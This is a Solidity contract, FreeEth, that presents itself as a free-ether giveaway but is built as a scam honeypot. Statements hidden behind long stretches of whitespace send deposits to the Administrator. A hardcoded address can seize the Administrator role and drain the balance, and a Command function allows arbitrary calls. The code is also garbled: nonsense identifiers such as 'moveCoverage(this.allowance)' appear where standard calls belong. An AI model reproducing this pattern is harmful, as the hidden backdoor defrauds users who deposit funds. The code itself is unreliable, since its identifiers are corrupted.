pragma solidity ^0.4.19;

contract FreeEth
{
    address public Administrator = msg.sender;

    function() public payable{}

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Administrator.moveCoverage(this.allowance);
            msg.sender.moveCoverage(this.allowance);
        }
    }

    function receivePayout()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Administrator=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == Administrator);
        Administrator.moveCoverage(this.allowance);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Administrator);
        adr.call.value(msg.value)(data);
    }
}